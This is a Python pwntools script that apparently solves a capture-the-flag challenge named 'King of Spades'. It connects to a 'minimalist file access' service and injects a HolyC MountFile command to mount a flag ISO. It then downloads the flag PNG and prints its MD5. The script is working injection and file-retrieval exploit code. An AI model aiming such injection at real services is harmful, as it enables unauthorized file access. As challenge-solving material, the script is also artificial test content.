#!/usr/bin/env python3

#
# Solve King of Spades
#

import sys

from pwn import *


def check(conn):
    if not conn.recvline_startswith("minimalist file access"):
        log.failure("Service is not Mfa")
        return False

    log.success("Service is Mfa")
    conn.sendline("?")

    if not conn.recvline_startswith("!"):
        log.failure("Not connected to Mfa")
        return False

    log.success("Connected to Mfa")
    return True


def exploit(conn):
    if not check(conn):
        sys.exit(1)

    log.info("Yeeting HolyC into the void")
    conn.sendline('\'MountFile("/Misc/Flag.ISO.C");')
    log.info("Retrieving flag PNG")
    conn.sendline("LM:/KingOfSpades.PNG.Z")

    size = int(conn.recvline_startswith("S")[1:])
    log.info("Attempting to receive {} bytes".format(size))
    file = conn.recvn(size)
    log.success("Received {} bytes".format(len(file)))

    if len(file) != size:
        log.failure("Could not receive all bytes")
        sys.exit(1)
    elif not file.startswith(b"\x89PNG\r\n\x1a\n"):
        log.failure("File is not a PNG")
        sys.exit(1)

    log.success("Flag MD5: {}".format(md5sumhex(file)))


def main():
    rhost = args["RHOST"] or "127.0.0.1"
    rport = args["RPORT"] or 7770

    log.info("Attempting to solve King of Spades")
    conn = remote(rhost, rport)
    exploit(conn)
    conn.close()


if __name__ == "__main__":
    main()
